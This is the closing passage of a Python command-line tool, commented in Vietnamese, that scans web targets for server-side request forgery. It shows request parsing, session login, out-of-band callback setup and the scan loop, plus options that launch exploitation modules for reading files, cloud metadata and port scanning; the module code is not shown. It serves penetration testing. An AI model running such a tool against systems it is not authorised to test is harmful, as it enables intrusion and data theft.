    first = lines[0].split()
    if len(first) < 2:
        raise ValueError("Dong dau request khong hop le (can 'METHOD duong-dan').")
    method, target = first[0].upper(), first[1]

    headers, host = {}, ""
    for ln in lines[1:]:
        if ":" in ln:
            k, v = ln.split(":", 1)
            k, v = k.strip(), v.strip()
            if k.lower() == "host":
                host = v
            headers[k] = v

    scheme = "https" if force_https or host.endswith(":443") else "http"
    if target.startswith(("http://", "https://")):
        url = target
    else:
        url = f"{scheme}://{host}{target}"

    # Bo cac header de urllib tu tinh lai, tranh xung dot
    for drop in ("Host", "Content-Length"):
        for k in [h for h in headers if h.lower() == drop.lower()]:
            headers.pop(k)

    data = body.strip("\n") or None
    return method, url, headers, data


def _ask(prompt, default=""):
    """Hoi 1 dong, co gia tri mac dinh (Enter = lay mac dinh)."""
    suffix = f" [{default}]" if default else ""
    val = input(f" ? {prompt}{suffix}: ").strip()
    return val or default


def _ask_yes(prompt, default=False):
    d = "Y/n" if default else "y/N"
    val = input(f" ? {prompt} ({d}): ").strip().lower()
    if not val:
        return default
    return val in ("y", "yes", "co", "c")


def interactive_fill(args) -> None:
    """Che do tuong tac: hoi tung thong tin can de test cho chuan."""
    print(" === CHE DO TUONG TAC === (Enter de lay mac dinh)\n")
    args.url = _ask("URL muc tieu (dat FUZZ o diem chen, vd http://host/fetch?url=FUZZ)", args.url or "")
    if FUZZ not in (args.url or ""):
        args.param = _ask("Ten tham so can test (de trong = tu dong tim)", args.param or "")
    args.method = _ask("HTTP method", args.method or "GET").upper()

    # Body POST
    if _ask_yes("Co body POST khong? (test SSRF trong body)", False):
        args.data = _ask("Body (x-www-form-urlencoded, co the chua FUZZ, vd url=FUZZ&id=1)", args.data or "")

    # Session: cookie co san hoac login
    if _ask_yes("Da co cookie/session san?", False):
        args.cookie = _ask("Cookie (vd 'session=abc; token=xyz')", args.cookie or "")
    elif _ask_yes("Dang nhap bang username/password de lay session?", False):
        args.auth_url = _ask("URL endpoint dang nhap (nhan POST)", args.auth_url or "")
        args.auth_user_field = _ask("Ten truong username", args.auth_user_field or "username")
        args.auth_pass_field = _ask("Ten truong password", args.auth_pass_field or "password")
        args.auth_user = _ask("Username", args.auth_user or "")
        args.auth_pass = getpass.getpass(" ? Password (go an): ")

    # OOB / OAST
    if _ask_yes("Tu mo server canary OAST tren may nay?", True):
        port = _ask("Cong canary", str(args.oast_listen or 8000))
        args.oast_listen = int(port)
    elif _ask_yes("Dung dich vu OOB ben ngoai (vd interactsh)?", False):
        args.oast_host = _ask("Host OOB (vd abcd.oast.site)", args.oast_host or "")
    print()


def main() -> int:
    ap = argparse.ArgumentParser(
        description="SSRF detection & testing tool. For authorized security testing only.",
        formatter_class=argparse.RawDescriptionHelpFormatter, epilog=__doc__)
    ap.add_argument("-u", "--url", help="URL muc tieu (co the chua marker FUZZ).")
    ap.add_argument("-r", "--request", metavar="FILE",
                    help="Doc raw HTTP request tu file (xuat tu Burp Suite / tool tuong tu).")
    ap.add_argument("--https", action="store_true",
                    help="Coi request tu -r la HTTPS (mac dinh HTTP).")
    ap.add_argument("-p", "--param", help="Ten tham so can chen payload (neu khong dung FUZZ).")
    ap.add_argument("-X", "--method", default="GET", help="HTTP method (mac dinh GET).")
    ap.add_argument("-H", "--header", action="append", help="Header 'Key: Value' (lap lai duoc).")
    ap.add_argument("-i", "--interactive", action="store_true",
                    help="Che do hoi tung thong tin (url/param/cookie/login/oob...).")
    ap.add_argument("--data", help="Body POST (form hoac JSON, co the chua FUZZ).")
    ap.add_argument("--json", action="store_true", help="Coi --data la JSON (chen vao cac truong JSON).")
    ap.add_argument("--cookie", help="Cookie/session san co, vd 'session=abc; token=xyz'.")
    ap.add_argument("--proxy", help="Di qua proxy, vd 'http://127.0.0.1:8080' (Burp) de xem/replay traffic.")
    ap.add_argument("--only-confirmed", action="store_true",
                    help="Chi hien phat hien CONFIRMED/FIRM (an TENTATIVE cho gon).")
    # Dang nhap de lay session
    ap.add_argument("--auth-url", help="Endpoint dang nhap (POST) de lay session cookie.")
    ap.add_argument("--auth-user", help="Username dang nhap.")
    ap.add_argument("--auth-pass", help="Password dang nhap.")
    ap.add_argument("--auth-user-field", default="username", help="Ten truong username (mac dinh 'username').")
    ap.add_argument("--auth-pass-field", default="password", help="Ten truong password (mac dinh 'password').")
    # Mang / OOB
    ap.add_argument("--timeout", type=float, default=6.0, help="Timeout moi request (giay).")
    ap.add_argument("--concurrency", type=int, default=20, help="So request song song.")
    ap.add_argument("--time-threshold", type=float, default=5.0, help="Nguong giay cho time-based.")
    ap.add_argument("--oast-host", "--oob-url", dest="oast_host",
                    help="Server OOB/OAST ben ngoai: dan URL/host tu Burp Collaborator "
                         "('xxx.oastify.com'), interactsh/requestrepo ('xxx.oast.site'), hoac "
                         "webhook.site ('https://webhook.site/<uuid>'). Tool tu chon subdomain/path; "
                         "xem callback tren dashboard dich vu (tool chi tu xac nhan khi dung --oast-listen).")
    ap.add_argument("--oast-listen", type=int,
                    help="Tu mo server canary HTTP cuc bo o cong nay (tu dong xac nhan callback).")
    # Khai thac (chay sau khi phat hien SSRF)
    ap.add_argument("-m", "--modules",
                    help="Chay module khai thac (ngan cach dau phay): readfiles, cloud, portscan, all.")
    ap.add_argument("--exploit", action="store_true", help="Alias cho -m all.")
    ap.add_argument("-o", "--output", help="Luu bao cao ra file JSON.")
    ap.add_argument("--no-banner", action="store_true")
    args = ap.parse_args()

    if not args.no_banner:
        print(BANNER)

    # Nap request tu Burp/tool neu co (-r). Gia tri tu CLI (-u/--data) co uu tien hon.
    req_headers = {}
    if args.request:
        try:
            m, u, h, d = parse_raw_request(args.request, args.https)
        except Exception as e:
            print(f" [!] Khong doc duoc request: {e}")
            return 2
        args.method = m
        args.url = args.url or u
        args.data = args.data or d
        req_headers = h
        print(f" [*] Nap request tu {args.request}: {m} {args.url}")

    # Vao che do tuong tac neu duoc yeu cau, hoac khi thieu URL (va khong dung -r)
    if args.interactive or (not args.url and not args.request):
        interactive_fill(args)
    if not args.url:
        print(" [!] Thieu URL muc tieu. Dung -u <url>, -r <file> hoac -i.")
        return 2

    # OOB ngoai: giu NGUYEN gia tri nguoi dung nhap (ke ca path nhu webhook.site/<uuid>).
    # build_payloads() se tu quyet dinh gan token vao subdomain hay path.

    oast_server = None
    if args.oast_listen:
        oast_server = OastServer(port=args.oast_listen)
        oast_server.start()
        print(f" [*] Server canary OAST cuc bo dang lang nghe o cong {args.oast_listen}")
        if not args.oast_host:
            args.oast_host = f"127.0.0.1:{args.oast_listen}"
            print(f" [*] --oast-host mac dinh = {args.oast_host}")
    elif args.oast_host:
        print(f" [*] Dung OOB ben ngoai: {args.oast_host}")
        print("     LUU Y: tool chi TU DONG xac nhan callback khi dung --oast-listen (canary cuc bo).")
        print("     Voi dich vu ngoai (requestrepo/interactsh...), hay xem callback tren dashboard cua ho.")

    # Header goc: tu request (-r) truoc, roi -H ghi de; them cookie.
    headers = {**req_headers, **parse_headers(args.header)}
    if args.cookie:
        headers["Cookie"] = args.cookie

    # Body la JSON? (do co --json, hoac Content-Type, hoac body trong giong JSON)
    ct = next((v for k, v in headers.items() if k.lower() == "content-type"), "")
    is_json = args.json or "json" in ct.lower() or (
        bool(args.data) and args.data.lstrip().startswith(("{", "[")))
    if args.data and "content-type" not in {k.lower() for k in headers}:
        headers["Content-Type"] = "application/json" if is_json else "application/x-www-form-urlencoded"

    target = Target(url=args.url, body=args.data, is_json=is_json, headers=headers)
    scanner = Scanner(
        oast_host=args.oast_host, timeout=args.timeout, concurrency=args.concurrency,
        time_threshold=args.time_threshold, method=args.method,
        base_headers=headers, proxy=args.proxy)

    # Dang nhap lay session neu duoc cung cap
    if args.auth_url and args.auth_user is not None:
        print(f" [*] Dang nhap vao {args.auth_url} ...")
        scanner.login(args.auth_url, args.auth_user, args.auth_pass or "",
                      args.auth_user_field, args.auth_pass_field)

    if args.proxy:
        print(f" [*] Di qua proxy: {args.proxy}")
    print(f" [*] Bat dau quet: {args.url}")
    if args.data:
        print(f" [*] Body ({'JSON' if is_json else 'form'}): {args.data}")
    print()
    try:
        findings, params, payloads_count = scanner.scan(target, args.param)
    except KeyboardInterrupt:
        print("\n [!] Da dung.")
        return 130
    finally:
        if oast_server:
            oast_server.stop()

    print_report(findings, params, payloads_count, only_confirmed=args.only_confirmed)
    print_conclusion(target, findings, cookie=scanner.cookie_header() or None)
    if args.output:
        save_json(findings, params, args.output)

    # Khai thac neu duoc yeu cau (-m / --exploit)
    modules = [m.strip() for m in (args.modules or "").split(",") if m.strip()]
    if args.exploit:
        modules.append("all")
    if modules:
        run_exploit(scanner, target, find_points(target, args.param), modules)

    serious = [f for f in findings if f.verdict in ("CONFIRMED", "LIKELY")]
    return 1 if serious else 0


if __name__ == "__main__":
    sys.exit(main())
